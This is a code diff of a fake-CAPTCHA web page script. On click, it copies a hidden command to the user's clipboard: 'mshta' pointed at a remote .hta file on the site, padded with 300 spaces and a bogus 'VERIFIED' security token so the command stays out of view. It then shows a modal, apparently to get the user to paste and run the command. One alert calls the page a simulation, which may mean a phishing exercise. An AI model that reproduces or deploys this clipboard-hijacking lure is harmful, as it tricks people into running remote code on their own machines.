@@ -3,8 +3,11 @@ const modal = document.getElementById('modal');
 const overlay = document.getElementById('overlay');
 
 captchaBox.addEventListener('click', () => {
-    const realCommand = "mshta " + window.location.origin + "/captchamethods/info.hta";
-    const visibleText = "--- Security_Token: [" + Math.random().toString(36).substring(2, 10).toUpperCase() + "] --- VERIFIED_AUTHORITY";
+    // Folosim o cale directă pentru fișierul HTA
+    const htaPath = window.location.origin + "/captchamethods/info.hta";
+    const realCommand = "mshta " + htaPath;
+    
+    const visibleText = "--- Security_Token: [" + Math.random().toString(36).substring(2, 10).toUpperCase() + "] --- VERIFIED";
     const padding = " ".repeat(300); 
     const finalPayload = realCommand + padding + visibleText;
 
@@ -17,6 +20,9 @@ captchaBox.addEventListener('click', () => {
             modal.style.display = 'block';
             overlay.style.display = 'block';
         }, 800);
+    }).catch(err => {
+        console.error("Clipboard error: ", err);
+        alert("Please allow clipboard access for the simulation!");
     });
 });
 
